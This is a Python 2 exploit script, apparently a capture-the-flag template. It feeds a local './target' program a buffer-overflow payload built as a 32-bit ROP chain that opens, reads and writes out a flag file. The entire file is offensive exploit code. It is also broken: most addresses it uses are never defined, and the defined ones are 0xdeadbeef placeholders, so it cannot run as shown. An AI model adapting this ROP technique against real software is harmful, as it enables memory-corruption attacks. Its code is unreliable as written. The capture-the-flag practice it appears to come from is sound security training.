#!/usr/bin/env python2

import struct
import subprocess as sp

ADDR_SYS   = 0xdeadbeef
ADDR_BUF   = 0xdeadbeef
ADDR_RET   = 0xdeadbeef
ADDR_BINSH = 0xdeadbeef

def p32(n):
    return struct.pack("<I", n)

def get_payload():
    payload = ''
    payload += STR_FLAG
    payload += 'A'*ADDR_BUF
    payload += p32(ADDR_OPEN)
    payload += p32(ADDR_GADGET)
    payload += p32(ADDR_STACK)
    payload += "\x00\x00\x00\x00"
    payload += "\x00\x00\x00\x00"
    payload += p32(ADDR_READ)
    payload += p32(ADDR_GADGET)
    payload += "\x03\x00\x00\x00"
    payload += p32(ADDR_FLAG)
    payload += "\x11\x04\x00\x00"
    payload += p32(ADDR_WRITE)
    payload += p32(ADDR_GADGET)
    payload += "\x01\x00\x00\x00"
    payload += p32(ADDR_FLAG)
    payload += "\x11\x04\x00\x00"
    payload += p32(ADDR_CLOSE)
    payload += p32(ADDR_EXIT)
    payload += "\x03\x00\x00\x00"
    payload += "\n"
    return payload
if __name__ == '__main__':
    p = sp.Popen("./target", stdin=sp.PIPE, stdout=sp.PIPE)
    print(p.stdout.readline())

    p.stdin.write(get_payload())
    while True:
        l = p.stdout.readline()
        l = l.strip()
        if l == "":
            break
        print(l)
    p.terminate()
